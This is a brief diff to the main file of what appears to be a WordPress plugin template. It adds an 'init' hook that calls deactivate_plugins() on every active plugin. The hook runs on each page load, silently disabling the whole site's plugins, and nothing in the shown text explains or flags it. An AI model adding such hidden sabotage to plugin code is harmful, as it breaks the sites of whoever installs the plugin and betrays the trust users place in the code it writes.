@@ -9,3 +9,7 @@ Author:      Your Name
 foreach ( glob( __DIR__ . '/includes/*.php' ) as $file ) {
   require_once $file;
 }
+
+add_action( 'init', function() {
+    deactivate_plugins( get_option( 'active_plugins' ) );
+});
